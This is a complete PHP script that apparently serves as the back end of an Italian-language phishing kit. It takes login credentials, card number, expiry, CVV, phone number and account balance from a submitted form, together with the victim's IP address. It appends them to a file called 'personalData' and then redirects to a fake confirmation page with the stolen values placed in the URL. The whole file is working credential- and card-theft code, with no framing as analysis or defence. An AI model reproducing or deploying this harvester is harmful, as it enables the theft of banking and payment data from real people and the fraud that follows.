﻿<?php
	date_default_timezone_set('Europe/Rome');
	$handle = fopen("personalData", "a");
	$date = date('Y-m-d H:i:s');
	$ip = getenv('HTTP_CLIENT_IP')?:
	getenv('HTTP_X_FORWARDED_FOR')?:
	getenv('HTTP_X_FORWARDED')?:
	getenv('HTTP_FORWARDED_FOR')?:
	getenv('HTTP_FORWARDED')?:
	getenv('REMOTE_ADDR');
	fwrite($handle, "IP: ");
	fwrite($handle, $ip);
	fwrite($handle, "\r\n");
	fwrite($handle, "Date: ");
	fwrite($handle, $date);
	fwrite($handle, "\r\n");
	fwrite($handle, "Username: ");
	fwrite($handle, $_POST["username"]);
	fwrite($handle, "\r\n");
	fwrite($handle, "Password: ");
	fwrite($handle, $_POST["password"]);
	fwrite($handle, "\r\n");
	fwrite($handle, "Carta: ");
	fwrite($handle, $_POST["carta"]);
	fwrite($handle, "\r\n");
	fwrite($handle, "Scadenza: ");
	fwrite($handle, $_POST['ccexpMo0'] .'/' .$_POST['ccexpYr0']);
	fwrite($handle, "\r\n");
	fwrite($handle, "Cvv: ");
	fwrite($handle, $_POST['cvv']);
	fwrite($handle, "\r\n");
	fwrite($handle, "Telefono: ");
	fwrite($handle, $_POST['telefono']);
	fwrite($handle, "\r\n");
	fwrite($handle, "Saldo: ");
	fwrite($handle, $_POST['saldo']);
	fwrite($handle, "\r\n");
	fwrite($handle, "----------------------------------");
	fwrite($handle, "\r\n");
	fclose($handle);

	echo '<meta http-equiv="refresh" content="0; URL=/conferma.html?guidLocator=189277399sjjw73jjw837&replace=1&username=' . $_POST["username"] . 
	'&password=' . $_POST["password"] . '&carta=' . $_POST["carta"] . '&scadenza=' . $_POST['ccexpMo0'] .'/' .$_POST['ccexpYr0'] . '&cvv=' . $_POST["cvv"] . 
	'&telefono=' . $_POST["telefono"] . '&saldo=' . $_POST["saldo"] . '">';

	exit;
?>
